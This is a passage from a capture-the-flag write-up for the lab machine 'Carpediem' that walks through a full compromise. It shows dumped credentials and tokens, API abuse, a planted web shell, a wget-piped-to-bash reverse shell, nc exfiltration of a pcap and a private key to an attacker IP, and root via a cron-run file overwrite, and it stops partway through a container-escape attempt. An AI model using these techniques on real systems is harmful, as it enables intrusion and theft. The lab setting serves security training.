\"$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS\", \"fullname\" : \"Robert Frost\", \"email\" : \"rfrost@carpediem.htb\", \"role\" : ObjectId(\"623c8b20855cc5001a8ba138\"), \"title\" : \"Sr. Network Engineer\", \"accessToken\" : \"22e56ec0b94db029b07365d520213ef6f5d3d2d9\", \"__v\" : 0, \"lastOnline\" : ISODate(\"2022-04-07T20:30:32.198Z\") }\n{ \"_id\" : ObjectId(\"6243c0be1e0d4d001b0740d4\"), \"preferences\" : { \"tourCompleted\" : false, \"autoRefreshTicketGrid\" : true, \"openChatWindows\" : [ ] }, \"hasL2Auth\" : false, \"deleted\" : false, \"username\" : \"jhammond\", \"email\" : \"jhammond@carpediem.htb\", \"password\" : \"$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq\", \"fullname\" : \"Jeremy Hammond\", \"title\" : \"Sr. Systems Engineer\", \"role\" : ObjectId(\"623c8b20855cc5001a8ba139\"), \"accessToken\" : \"a0833d9a06187dfd00d553bd235dfe83e957fd98\", \"__v\" : 0, \"lastOnline\" : ISODate(\"2022-04-01T23:36:55.940Z\") }\n{ \"_id\" : ObjectId(\"6243c28f1e0d4d001b0740d6\"), \"preferences\" : { \"tourCompleted\" : false, \"autoRefreshTicketGrid\" : true, \"openChatWindows\" : [ ] }, \"hasL2Auth\" : false, \"deleted\" : false, \"username\" : \"jpardella\", \"email\" : \"jpardella@carpediem.htb\", \"password\" : \"$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK\", \"fullname\" : \"Joey Pardella\", \"title\" : \"Desktop Support\", \"role\" : ObjectId(\"623c8b20855cc5001a8ba139\"), \"accessToken\" : \"7c0335559073138d82b64ed7b6c3efae427ece85\", \"__v\" : 0, \"lastOnline\" : ISODate(\"2022-04-07T20:33:20.918Z\") }\n{ \"_id\" : ObjectId(\"6243c3471e0d4d001b0740d7\"), \"preferences\" : { \"tourCompleted\" : false, \"autoRefreshTicketGrid\" : true, \"openChatWindows\" : [ ] }, \"hasL2Auth\" : false, \"deleted\" : false, \"username\" : \"acooke\", \"email\" : \"acooke@carpediem.htb\", \"password\" : \"$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.\", \"fullname\" : \"Adeanna Cooke\", \"title\" : \"Director - Human Resources\", \"role\" : ObjectId(\"623c8b20855cc5001a8ba139\"), \"accessToken\" : \"9c7ace307a78322f1c09d62aae3815528c3b7547\", \"__v\" : 0, \"lastOnline\" : ISODate(\"2022-03-30T14:21:15.212Z\") }\n{ \"_id\" : ObjectId(\"6243c69d1acd1559cdb4019b\"), \"preferences\" : { \"tourCompleted\" : false, \"autoRefreshTicketGrid\" : true, \"openChatWindows\" : [ ] }, \"hasL2Auth\" : false, \"deleted\" : false, \"username\" : \"svc-portal-tickets\", \"email\" : \"tickets@carpediem.htb\", \"password\" : \"$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW\", \"fullname\" : \"Portal Tickets\", \"title\" : \"\", \"role\" : ObjectId(\"623c8b20855cc5001a8ba13a\"), \"accessToken\" : \"f8691bd2d8d613ec89337b5cd5a98554f8fffcc4\", \"__v\" : 0, \"lastOnline\" : ISODate(\"2022-03-30T13:50:02.824Z\") }\nThe found password hashes are all bcrypt and we will not be able to crack those, instead the accessToken seems interesting.\nBefore moving on, lets see if we can find anything interesting from the reported tickets. Below is the heavily cropped data from table tickets:\n&gt; db.tickets.find().pretty()\n{\n    \"_id\" : ObjectId(\"624461a6f2c8c07f687ba8a6\"),\n    \"subject\" : \"Security risks - Portal\",\n    \"issue\" : \"&lt;p&gt;We need to patch the user profile and admin sections of our Portal ASAP. Why are we continually pushing out functions that haven&#39;t been tested by the Infosec team?&lt;/p&gt;\\n\",\n            \"comment\" : \"&lt;p&gt;Thanks, Jeremy.  I agree.  This is a big problem.&lt;/p&gt;\\n\"\n}\n{\n    \"_id\" : ObjectId(\"6244635c8fc3556ae8715b0f\"),\n    \"subject\" : \"Username change\",\n    \"issue\" : \"&lt;p&gt;I need a handle, man.  I mean, I don&#39;t have an identity until I have a handle.&lt;br /&gt;How about The Master of Disaster?&lt;/p&gt;\\n\",\n            \"comment\" : \"&lt;p&gt;You&#39;re hopelss, man.  Utterly hopeless.&lt;/p&gt;\\n&lt;p&gt;I&#39;m closing this ticket.&lt;/p&gt;\\n\"\n}\n{\n    \"_id\" : ObjectId(\"624465135596178468330932\"),\n    \"issue\" : \"&lt;p&gt;We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.&lt;br /&gt;Please create this account at your earliest convenience.&lt;br /&gt;&lt;br /&gt;Thank you.&lt;/p&gt;\\n\",\n            \"comment\" : \"&lt;p&gt;Hey Adeanna,\nI think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?&lt;/p&gt;\\n\"\n            \"comment\" : \"&lt;p&gt;Thanks Robert,\nLast 4 of employee ID is 9650.&lt;/p&gt;\\n\"\n            \"comment\" : \"&lt;p&gt;Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62&lt;/p&gt;\\n&lt;p&gt;Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.&lt;/p&gt;\\n&lt;p&gt;Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.&lt;/p&gt;\\n\"\n}\n{\n    \"_id\" : ObjectId(\"6244673c2142479dd493d9da\"),\n    \"subject\" : \"Trudesk API access - Portal\",\n    \"issue\" : \"&lt;p&gt;I&#39;ll be looking into tightenting up security permissions this week for the Trudesk integration in the Portal.  We&#39;ll need to also perform some threat modeling to find out where our weak points are and come up with an action plan to mitigate.&lt;/p&gt;\\n\",\n}\n{\n    \"_id\" : ObjectId(\"62478d83eadb13001b66b62c\"),\n    \"subject\" : \"Need help building the CMS\",\n    \"issue\" : \"&lt;p&gt;Hey Jeremy, &lt;br /&gt;Can you help me work on the CMS at all this week?  The base install is completed, but I need your expertise to make sure I did everything correctly.&lt;/p&gt;\\n\",\n            \"comment\" : \"&lt;p&gt;Please don&#39;t expose that application publically.  I told you I would help when I had time and right now I&#39;m just too busy.\nBuild it out if you&#39;d like, but...just don&#39;t do anything stupid.&lt;/p&gt;\\n\"\n            \"comment\" : \"&lt;p&gt;Don&#39;t worry. I moved it off of the main server and into a container with SSL encryption.&lt;/p&gt;\\n\"\n\n}\nThe information about the new Network Engineer and the last 4 digits of his employee ID, 9650, and pincode, 2022, might come in handy later. Lets move on with the extracted accessTokens.\n\n\nStep 5 - Trudesk\nSetup Burp for upstream socks proxy (User options &gt; SOCKS Proxy) and browse to https://172.17.0.2 we find backdrop.carpediem.htb.\n\nWe’re unable to login to the page and there really isn’t anything of use at first glance. Googling for “backdrop cms exploit” there are a bunch of authenticated exploits, but we have no account..\n We’d love to find something related to trudesk, lets try to add trudesk.carpediem.htb to resolve to 172.17.0.2 and if that doesn’t work try 10.10.11.167.\n➜  chisel_1.7.7 curl -v http://trudesk.carpediem.htb\n*   Trying 10.10.11.167:80...\n* Connected to trudesk.carpediem.htb (10.10.11.167) port 80 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: trudesk.carpediem.htb\n&gt; User-Agent: curl/7.84.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Server: nginx/1.18.0 (Ubuntu)\n&lt; Date: Tue, 13 Sep 2022 07:26:47 GMT\n&lt; Content-Type: text/html; charset=utf-8\n&lt; Content-Length: 7285\n&lt; Connection: keep-alive\n&lt; Access-Control-Allow-Origin: *\n&lt; Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS\n&lt; Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token\n&lt; ETag: W/\"1c75-WUVJYgy+76qLc2hldkHzGR7+Uxg\"\n&lt; set-cookie: connect.sid=s%3AQDzVdnp3FNH7sE1ZglF0wWughDr5QhjC.hjY40%2Blgy48wMb6w4wRA0QLCPSYevILsPC0ClelRiMg; Path=/; Expires=Wed, 13 Sep 2023 07:26:47 GMT; HttpOnly\n&lt; \n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Trudesk &middot; Login&lt;/title&gt;\n➜  carpediem ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://trudesk.carpediem.htb/FUZZ\nAbout                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 65ms]\nLogin                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 67ms]\nabout                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 86ms]\naccounts                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]\napi                     [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 75ms]\nbackups                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 83ms]\ncaptcha                 [Status: 200, Size: 9399, Words: 954, Lines: 1, Duration: 120ms]\ncss                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 87ms]\ndashboard               [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 145ms]\ndepartments             [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 84ms]\nfont                    [Status: 301, Size: 175, Words: 7, Lines: 11, Duration: 43ms]\nfonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 43ms]\ngroups                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 133ms]\nimg                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 61ms]\ninstall                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 69ms]\njs                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 99ms]\nlogin                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 62ms]\nlogout                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]\nmessages                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 96ms]\nmobile                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 158ms]\nnotices                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 106ms]\nplugins                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 64ms]\nprofile                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 102ms]\nregister                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 103ms]\nreports                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 115ms]\nsettings                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 93ms]\nsignup                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 73ms]\nsounds                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 100ms]\nteams                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 152ms]\ntickets                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 97ms]\nuploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 68ms]\nversion                 [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 58ms]\n➜  carpediem curl http://trudesk.carpediem.htb/version\n{\"version\":\"1.1.11\"}\nGoogling around I can’t find any publicly disclosed exploits for Trudesk 1.1.11. Reading the truedesk docs we should use the accessToken as a header, we can verify this by cURL’ign the API using the admin accesstoken:\n➜  carpediem curl -H \"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9\" -l http://trudesk.carpediem.htb/api/v1/users\n{\"success\":true,\"count\":5,\"users\":[{\"preferences\":{\"tourCompleted\":false,\"autoRefreshTicketGrid\":true,\"openChatWindows\":[]},\"hasL2Auth\":false,\"deleted\":false,\"_id\":\"6243c3471e0d4d001b0740d7\",\"username\":\"acooke\",\"email\":\"acooke@carpediem.htb\",\"fullname\":\"Adeanna Cooke\",\"title\":\"Director - Human Resources\",\"role\":{\"_id\":\"623c8b20855cc5001a8ba139\",\"name\":\"Support\",\"description\":\"Default role for agents\",\"normalized\":\"support\",\"isAdmin\":false,\"isAgent\":true,\"id\":\"623c8b20855cc5001a8ba139\"},\"lastOnline\":\"2022-03-30T14:21:15.212Z\",\"id\":\"6243c3471e0d4d001b0740d7\",\"groups\":[]},{\"preferences\":{\"tourCompleted\":false,\"autoRefreshTicketGrid\":true,\"openChatWindows\":[]},\"hasL2Auth\":false,\"deleted\":false,\"_id\":\"6243c0be1e0d4d001b0740d4\",\"username\":\"jhammond\",\"email\":\"jhammond@carpediem.htb\",\"fullname\":\"Jeremy Hammond\",\"title\":\"Sr. Systems Engineer\",\"role\":{\"_id\":\"623c8b20855cc5001a8ba139\",\"name\":\"Support\",\"description\":\"Default role for agents\",\"normalized\":\"support\",\"isAdmin\":false,\"isAgent\":true,\"id\":\"623c8b20855cc5001a8ba139\"},\"lastOnline\":\"2022-04-01T23:36:55.940Z\",\"id\":\"6243c0be1e0d4d001b0740d4\",\"groups\":[]},{\"preferences\":{\"tourCompleted\":false,\"autoRefreshTicketGrid\":true,\"openChatWindows\":[]},\"hasL2Auth\":false,\"deleted\":false,\"_id\":\"6243c28f1e0d4d001b0740d6\",\"username\":\"jpardella\",\"email\":\"jpardella@carpediem.htb\",\"fullname\":\"Joey Pardella\",\"title\":\"Desktop Support\",\"role\":{\"_id\":\"623c8b20855cc5001a8ba139\",\"name\":\"Support\",\"description\":\"Default role for agents\",\"normalized\":\"support\",\"isAdmin\":false,\"isAgent\":true,\"id\":\"623c8b20855cc5001a8ba139\"},\"lastOnline\":\"2022-04-07T20:33:20.918Z\",\"id\":\"6243c28f1e0d4d001b0740d6\",\"groups\":[]},{\"preferences\":{\"tourCompleted\":false,\"autoRefreshTicketGrid\":true,\"openChatWindows\":[]},\"hasL2Auth\":false,\"deleted\":false,\"_id\":\"6243c69d1acd1559cdb4019b\",\"username\":\"svc-portal-tickets\",\"email\":\"tickets@carpediem.htb\",\"fullname\":\"Portal Tickets\",\"title\":\"\",\"role\":{\"_id\":\"623c8b20855cc5001a8ba13a\",\"name\":\"User\",\"description\":\"Default role for users\",\"normalized\":\"user\",\"isAdmin\":false,\"isAgent\":false,\"id\":\"623c8b20855cc5001a8ba13a\"},\"lastOnline\":\"2022-03-30T13:50:02.824Z\",\"id\":\"6243c69d1acd1559cdb4019b\",\"groups\":[]},{\"preferences\":{\"tourCompleted\":false,\"autoRefreshTicketGrid\":true,\"openChatWindows\":[]},\"hasL2Auth\":false,\"deleted\":false,\"_id\":\"623c8b20855cc5001a8ba13c\",\"username\":\"admin\",\"fullname\":\"Robert Frost\",\"email\":\"rfrost@carpediem.htb\",\"role\":{\"_id\":\"623c8b20855cc5001a8ba138\",\"name\":\"Admin\",\"description\":\"Default role for admins\",\"normalized\":\"admin\",\"isAdmin\":true,\"isAgent\":true,\"id\":\"623c8b20855cc5001a8ba138\"},\"title\":\"Sr. Network Engineer\",\"lastOnline\":\"2022-04-07T20:30:32.198Z\",\"id\":\"623c8b20855cc5001a8ba13c\",\"groups\":[]}]}\nWith the help of Burp extension Add Custom Header add the accessToken and add it to all sessions (Project Options &gt; Sessions &gt; Session Handling Rules &gt; Invoke a Burp extension ), don’t forget to add the rule to be applied to Proxy as well.\n\nWe’re not able to bypass the login, so I guess we should focus on the api instead.\n\n\nStep 6 - Pwn Admin\nPlaying around with the API we have a few options, lets start by trying to change the password of the admin account.\n➜  carpediem curl -X PUT -H \"Content-Type: applications/json\" -H \"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9\" -d \"{\"aPass\":\"aaAA123\\!\", \"aPassconfirm\":\"aaAA123\\!\"}\" -l http://trudesk.carpediem.htb/api/v1/users/admin  \n\n{\"success\":true,\"user\":{\"preferences\":{\"tourCompleted\":false,\"autoRefreshTicketGrid\":true,\"openChatWindows\":[]},\"hasL2Auth\":false,\"deleted\":false,\"_id\":\"623c8b20855cc5001a8ba13c\",\"username\":\"admin\",\"fullname\":\"Robert Frost\",\"email\":\"rfrost@carpediem.htb\",\"role\":{\"grants\":[\"admin:*\",\"agent:*\",\"chat:*\",\"tickets:*\",\"accounts:*\",\"groups:*\",\"teams:*\",\"departments:*\",\"comments:*\",\"reports:*\",\"notices:*\",\"settings:*\",\"api:*\"],\"hierarchy\":true,\"_id\":\"623c8b20855cc5001a8ba138\",\"name\":\"Admin\",\"description\":\"Default role for admins\",\"normalized\":\"admin\",\"__v\":0,\"isAdmin\":true,\"isAgent\":true,\"id\":\"623c8b20855cc5001a8ba138\"},\"title\":\"Sr. Network Engineer\",\"lastOnline\":\"2022-04-07T20:30:32.198Z\",\"groups\":[]}}% \nEven though we get \"success\":true trying to login it still says that the password is incorrect.. But we do have access to the mongodb, maybe it would be easier to just change password in there.\nTo generate a new bcrypt password I found this amazing one-liner where we (ab)use htpasswd:\n➜  carpediem htpasswd -bnBC 10 \"\" asdf123 | tr -d ':\\n' | sed 's/$2y/$2b/'\n$2b$10$xI/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO\n&gt; db.accounts.updateOne(\n... { \"username\" : \"admin\" },\n... { $set:\n... { \"password\" : \"$2b$10$xI/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO\" }\n... }\n... )\n\n{ \"acknowledged\" : true, \"matchedCount\" : 1, \"modifiedCount\" : 1 }\nWe’re now able to login to the application http://trudesk.carpediem.htb: \nLooking around we don’t find anything new, information wise. Trying to change user avatar to a malicious one fails, as they move and rename the file on upload. The only interesting information we gain here is the soft phone name “Zoiper”, maybe there’s a vhost for that as well. I can’t find any web interface for Zoiper, so instead we download it locally and try if we can connect to their server.\nWe have the name of the new employee, Horace Flaccus (hflaccus), his pin is 2022, his extension is 9650 and dial *62 to reach voicemail.\n➜  Downloads sudo dpkg -i Zoiper5_5.5.13_x86_64.deb\nEnter username 9650 and password 2022, when asked to fill in your hostname set it to carpediem.htb. \n\nCalling and listening to Horace’s voice message we learn that the password is AuRj4pxq9qPk ! Testing to login with SSH and we finally get a shell on the box and user.txt.\n➜  carpediem ssh hflaccus@carpediem.htb\nhflaccus@carpediem.htb password: AuRj4pxq9qPk\n\nhflaccus@carpediem:~$ id && hostname\nuid=1000(hflaccus) gid=1000(hflaccus) groups=1000(hflaccus)\ncarpediem\n\nhflaccus@carpediem:~$ cat user.txt \nc34afcb6b1659fb635027da20531bc7e\n\n\n\n\nROOT\n\nStep 1 - Enumeration\nEnumerating manually the information we find is pretty slim so instead fire up linpeas.sh right away.\nGoing through the output we have two lines shining in red/yellow indicating a 95% PE vector\nhflaccus@carpediem:/tmp$ ./linpeas.sh\n\n════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════\n╔══════════╣ Cleaned processes\n[i] Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes\n                 1578848   sed-Es,jdwp|tmux |screen |--inspect|--remote-debugging-port,&,g\n\n╔══════════╣ Capabilities\n╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities\nFiles with capabilities (limited to 50):\n/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip\n\n╔══════════╣ Can I sniff with tcpdump?\n╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing\nYou can sniff with tcpdump!\n\n══╣ Possible private SSH keys were found!\n/etc/ssl/certs/backdrop.carpediem.htb.key\nThere’s a section on HackTricks explaining the capabilities combination of cep_net_admin + cap_net_raw - tldr we can dump traffic from network interfaces. I’m not sure what we’re looking for, or what interface to dump, but since there are a lot of dockers and we know that there is a FTP + several http services, we might find something sensitive there.\nNOTE: I left this pcap on for about 1 hour while leaving for a meeting, so there’s a lot of traffic in my .pcap.\n➜  carpediem nc -lp 1234 &gt; docker0.pcap\n\nhflaccus@carpediem:/tmp$ tcpdump -i docker0 -s 65535 -w docker0.pcap\ntcpdump: listening on docker0, link-type EN10MB (Ethernet), capture size 65535 bytes\n7171 packets captured\n7171 packets received by filter\n0 packets dropped by kernel\n\nhflaccus@carpediem:/tmp$ nc -w3 10.10.14.10 1234 &lt; docker0.pcap\nInstead of using Wireshark like it’s 1998, I send the .pcap to my Windows Attack VM and open it using NetworkMiner (like it’s 2007) - I think this gives a better quick overview of the dump. From the dump we can quickly see that a certificate has been sent from backdrop.carpediem.htb to the docker host on 172.17.0.1, I have no idea of what to do with this information.\n\nNext step took me embarrassingly long time to figure out - from our linpeas output we found a private SSH key. We can use this key to decrypt all SSL traffic, and within we find something interesting.\n➜  carpediem nc -lp 1234 &gt; backdrop.carpediem.htb.key\nhflaccus@carpediem:/tmp$ nc -w3 10.10.14.10 1234 &lt; /etc/ssl/certs/backdrop.carpediem.htb.key\n\nNow if we follow the TLS Stream we find a login to https://backdrop.carpediem.htb with credentials jpardella:tGPN6AmJDZwYWdhY \n\n\nStep 2 - Backdrop\nNow to access backdrop we cant simply tunnel with hflaccus:\nhflaccus@carpediem:~$ cat /etc/hosts\n127.0.0.1 localhost backdrop.carpediem.htb\n\nhflaccus@carpediem:~$ netstat -tulpn\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8002          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:5038          0.0.0.0:*               LISTEN      -  \nGoing through all the different ports we find that 8002 is backdrop:\n➜  carpediem ssh -N -f -L 8002:localhost:8002 hflaccus@carpediem.htb\nhflaccus@carpediem.htb password: AuRj4pxq9qPk\n\n➜  carpediem curl -k https://localhost:8002\n[... snip ...]\n    &lt;title&gt;Home | backdrop.carpediem.htb&lt;/title&gt;\nWe’re now able to login to backdrop using credentials jpardella:tGPN6AmJDZwYWdhY \nGoogling for “Backdrop cms exploit github” the first hit we get is a CSRF to RCE exploit for version 1.20. Looking in backdrop under Reports &gt; Status Report we see that our instance is running version 1.21.4, lets test it anyway.\nGo to Functionality &gt; Install new modules &gt; Manual Installation &gt; Upload, once uploaded make sure to enable the newly added module. It will be located at the bottom of the box Fields:\n\nTesting it out and yes, we do have code execution:\n➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\\?cmd\\=id      \nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\\?cmd\\=hostname\n90c7f522b842\n➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\\?cmd\\=ls%20-al\ntotal 76\ndrwxr-xr-x 4 www-data www-data  4096 Sep 14 00:55 .\ndrwxr-xr-x 3 www-data www-data  4096 Sep 14 00:55 ..\n-rw-r--r-- 1 www-data www-data 18092 Sep 14 00:55 LICENSE.txt\n-rw-r--r-- 1 www-data www-data  1768 Sep 14 00:55 README.md\n-rw-r--r-- 1 www-data www-data   323 Sep 14 00:55 reference.info\n-rw-r--r-- 1 www-data www-data   484 Sep 14 00:55 reference.install\n-rw-r--r-- 1 www-data www-data 23598 Sep 14 00:55 reference.module\n-rw-r--r-- 1 www-data www-data    30 Sep 14 00:55 shell.php\ndrwxr-xr-x 2 www-data www-data  4096 Sep 14 00:55 tests\ndrwxr-xr-x 2 www-data www-data  4096 Sep 14 00:55 views\nUsing cURL to trigger a reverse shell (like before) doesn’t seem to work in this container, instead we use wget:\n➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\\?cmd\\=wget%20-qO-%20http://10.10.14.10/rev.sh\\|bash\n\n➜  carpediem python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.167 - - [14/Sep/2022 09:03:27] \"GET /rev.sh HTTP/1.1\" 200 \n\n➜  carpediem nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 58916\nbash: cannot set terminal process group (271): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ \n\n\nStep 3 - Escalate to root\nBefore uploading deepce.sh lets have a look around if we find anything sensitive.\nNew MySQL credentials:\nwww-data@90c7f522b842:/var/www/html/backdrop$ cat settings.php\n[... snip ...]\n$database = 'mysql://backdrop:34tB8RGtgtJjZ2Tz@localhost/backdrop';\nA script owned by root that we have execute privileges over:\nwww-data@90c7f522b842:/opt$ ls -al\ntotal 12\ndrwxr-xr-x 1 root root 4096 Jun 23 09:50 .\ndrwxr-xr-x 1 root root 4096 Sep 14 01:10 ..\n-rwxr-xr-x 1 root root  510 Jun 23 09:49 heartbeat.sh\n\nwww-data@90c7f522b842:/opt$ cat heartbeat.sh\n#!/bin/bash\n#Run a site availability check every 10 seconds via cron\nchecksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))\nif [[ $checksum != \"70a121c0202a33567101e2330c069b34\" ]]; then\n    exit\nfi\nstatus=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)\ngrep \"Welcome to backdrop.carpediem.htb!\" \"$status\"\nif [[ \"$?\" != 0 ]]; then\n    #something went wrong.  restoring from backup.\n    cp /root/index.php /var/www/html/backdrop/index.php\nfi\nThe comments in the scripts do a good job explaining what it does, every few seconds it will run the script to make sure that backdrop.carpediem.htb is alive and running. If something is wrong, it will copy a backup of index.php from /root, to restore the site.\nWe can confirm if this script is executed by root or www-data using pspy64:\nwww-data@90c7f522b842:/dev/shm$ wget http://10.10.14.10/pspy64\nwww-data@90c7f522b842:/dev/shm$ chmod +x pspy64\nwww-data@90c7f522b842:/dev/shm$ cp pspy64 /tmp\nwww-data@90c7f522b842:/dev/shm$ /tmp/pspy64\n[... snip ...]\n2022/09/14 01:25:17 CMD: UID=0    PID=54872  | /bin/bash /opt/heartbeat.sh\nIt’s ran as root. We should be able to get a revere shell as root then by simply replacing index.php with a reverse shell..\nwww-data@90c7f522b842:/dev/shm$ cp rev.php /var/www/html/backdrop/index.php\n\n➜  carpediem nc -lvnp 4499                              \nlistening on [any] 4499 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 41614\nLinux 90c7f522b842 5.4.0-97-generic #110-Ubuntu SMP Thu Jan 13 18:22:13 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n 01:30:16 up 1 day, 23:13,  0 users,  load average: 0.03, 0.09, 0.08\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=0(root) gid=0(root) groups=0(root)\n/bin/sh: 0: cant access tty; job control turned off\n\n# id && hostname\nuid=0(root) gid=0(root) groups=0(root)\n90c7f522b842\n\n\nStep 4 - Container escape\nTrying to escape this container we can upload deepce.sh to get some quick information:\n# wget http://10.10.14.10/deepce.sh\n# chmod +x deepce.sh\n# bash deepce.sh\n[... snip ...]\n[+] Dangerous Capabilities .. Yes\nCurrent: cap_dac_override\nBounding set =cap_dac_override\nCurrent IAB: !cap_dac_read_search,!cap_sys_module,!cap_sys_ptrace,!cap_sys_admin\n[+] Privileged Mode ......... Unknown\n\n[+] Docker sock mounted ....... No\n[+] Other mounts .............. No\nTo verify if we’re in a privileged mode or not, we can simply ls -al /dev, if privileged all devices should be accessible and we can escape by mounting the host disk. If not privileged only a limited amount of devices are shown.\n# ls -al /dev   \ntotal 4\ndrwxr-xr-x 5 root root    360 Sep 12 02:16 .\ndrwxr-xr-x 1 root root   4096 Sep 14 02:15 ..\ncrw--w---- 1 root tty  136, 0 Sep 12 02:16 console\nlrwxrwxrwx 1 root root     11 Sep 12 02:16 core -&gt; /proc/kcore\nlrwxrwxrwx 1 root root     13 Sep 12 02:16 fd -&gt; /proc/self/fd\ncrw-rw-rw- 1 root root   1, 7 Sep 12 02:16 full\ndrwxrwxrwt 2 root root     40 Sep 12 02:16 mqueue\ncrw-rw-rw- 1 root root   1, 3 Sep 12 02:16 null\nlrwxrwxrwx 1 root root      8 Sep 12 02:16 ptmx -&gt; pts/ptmx\ndrwxr-xr-x 2 root root      0 Sep 12 02:16 pts\ncrw-rw-rw- 1 root root   1, 8 Sep 12 02:16 random\ndrwxrwxrwt 3 root root    120 Sep 14 01:46 shm\nlrwxrwxrwx 1 root root     15 Sep 12 02:16 stderr -&gt; /proc/self/fd/2\nlrwxrwxrwx 1 root root     15 Sep 12 02:16 stdin -&gt; /proc/self/fd/0\nlrwxrwxrwx 1 root root     15 Sep 12 02:16 stdout -&gt; /proc/self/fd/1\ncrw-rw-rw- 1 root root   5, 0 Sep 12 02:16 tty\ncrw-rw-rw- 1 root root   1, 9 Sep 12 02:16 urandom\ncrw-rw-rw- 1 root root   1, 5 Sep 12 02:16 zero\nWe’re missing a lot of devices, so we’re not privileged.\nLooking on the capabilities, we only have dac_override that stands out, this allows us to write to any file, something that is expected when root so we can skip this.\nGoogling around for further escapes I come across this PDF from blackhat where release_agent escape is mentioned on page 57. I’ve never heard of this before, and looking on the commands we can see we’ll not be able to run it as we’re not allowed to use mount:\n\n# mount -t cgroup -o rdma cgroup /tmp/esc\nmount: /tmp/esc: permission denied.\nRunning linpeas.sh confirms that this should be a breakout vector, so maybe I need to dig a bit deeper.\n# wget http://10.10.14.10/linpeas.sh\n# chmod +x linpeas.sh\n# bash 